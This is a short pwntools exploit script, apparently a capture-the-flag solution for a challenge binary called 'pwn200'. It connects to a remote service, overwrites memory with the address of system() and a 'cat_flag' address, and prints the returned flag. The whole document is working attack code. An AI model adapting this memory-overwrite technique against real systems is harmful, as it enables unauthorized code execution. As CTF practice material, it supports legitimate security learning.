from pwn import *

s = remote('35.154.158.26', 31337)
e = ELF('./pwn200')

cat_flag = 0x08048741

def overwrite(msg):
    s.recvline()
    s.sendline(str(msg))

s.recvline()
s.sendline('24')

s.recvline()
s.sendline('3')

overwrite(e.plt['system'])
overwrite('1')
overwrite(cat_flag)
s.recvline()
print 'FLAG : ' + s.recv(1024)
